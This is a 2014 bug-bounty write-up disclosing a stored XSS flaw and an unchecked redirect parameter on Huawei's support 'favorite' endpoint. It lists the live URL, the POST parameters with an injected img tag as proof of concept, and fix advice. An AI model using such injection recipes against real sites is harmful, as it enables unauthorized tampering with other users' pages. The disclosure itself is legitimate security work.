---
title: Bugbounty/ Huawei Stored XSS vuln @ Support 
date: Apr 28 2014
tags: ["huawei", "support", "webapp", "xss", "vuln", "bugbounty"]
---

## Vulnerability No. #2
Huawei support page have a special POST request to favorite support line / link for future reference. Because user input is not properly sanitized, client is allowed to insert HTML code inside special parameter sent through request. This vulnerability can lead to various types of XSS or even some type of DDoS attack. Check the video at the end to see vulnerability PoC live.

## PoC
This vulnerability can be recreated either by "Live HTTP Headers" plugin for Firefox, or in other way, using special tools to reply the request like Burpsuite or Acunetix. Specially scripted software can be coded too using Python or Perl. You may also try to edit inline HTML over inspect-element to recreate the bug. 

Vuln URL:

	http://support.huawei.com/support/pages/search/resultFavorite.do?actionFlag=addResultFavorite

Request:

	POST

Params:

	* docId=SE0000696205 [1]  
	* docName=<img src="http://imgur.com/1drVAHB.jpg" /> [2]  
	* keywords=HUAWEI_VULN [3]  
	* lang=en [4]  
	* searchType=SUPPORT_DOCS [5]  
	* url=http://example.com [6]  

Details:

	[1] = Document ID, leave as is  
	[2] = Image or any other input validation (vulnerable parameter)  
	[3] = Keywords / Category  
	[4] = Language, leave as is  
	[5] = Search type, leave as is  
	[6] = Redirection page  

## Fix
Try to sanitize user input, check if "docName" parameter is proper, use functions to escape special chars, and allow redirection only to host/server of Huawei, so fix the "url" parameter. 

## Video
<iframe src="https://player.vimeo.com/video/93203325" width="500" height="415" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>